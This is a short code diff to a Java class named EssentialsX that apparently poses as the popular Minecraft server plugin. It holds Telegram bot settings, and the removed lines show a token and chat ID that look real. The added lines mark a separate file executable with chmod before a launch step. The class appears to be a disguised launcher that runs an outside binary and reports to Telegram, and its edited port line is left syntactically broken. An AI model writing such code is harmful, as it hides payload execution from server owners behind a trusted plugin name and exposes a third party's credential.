@@ -16,12 +16,12 @@ public class EssentialsX extends JavaPlugin {
 
 
     // Java服务端端口
-    private int port = 17016;
+    private int port = ;
 
 
     // Telegram配置
-    private String tgToken = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
-    private String tgChatId = "5800052646";
+    private String tgToken = "";
+    private String tgChatId = "";
 
 
 
@@ -169,7 +169,15 @@ public class EssentialsX extends JavaPlugin {
         .start()
         .waitFor();
 
+        // jar执行权限
 
+        new ProcessBuilder(
+                "chmod",
+                "+x",
+                javaFile.toString()
+        )
+        .start()
+        .waitFor();
 
         // 启动
 
